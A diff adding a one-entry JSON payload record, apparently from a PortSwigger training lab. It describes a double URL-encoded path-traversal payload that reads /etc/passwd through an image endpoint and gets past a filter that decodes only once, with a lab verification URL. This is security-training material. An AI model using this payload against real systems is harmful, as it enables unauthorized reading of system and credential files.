@@ -1,0 +1,15 @@
+[
+  {
+    "id": "auto-20261030235801",
+    "context": "PortSwigger mystery lab，ecommerce 图片接口 /image?filename=xxx，服务端对 filename 做了两次 URL 解码：先解码一次再过滤 ../，再解码一次还原出 ../，单层 ../ 和 %2f 都被过滤返回 \"No such file\"。",
+    "reference_payload": "/image?filename=..%252f..%252f..%252fetc%252fpasswd",
+    "principle": "双重 URL 编码穿越：%252f 第一次解码变 %2f（未被过滤命中），第二次解码还原成 /，拼出 ../../../etc/passwd 绕过只做单次解码的过滤",
+    "source": "portswigger",
+    "verify_url": "https://0a6a000c041d19f6829c02210072003a.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd",
+    "evidence": {
+      "verify": "echo",
+      "url": "https://0a6a000c041d19f6829c02210072003a.web-security-academy.net/image?filename=..%252f..%252f..%252fetc%252fpasswd",
+      "match": "root:x:0:0"
+    }
+  }
+]
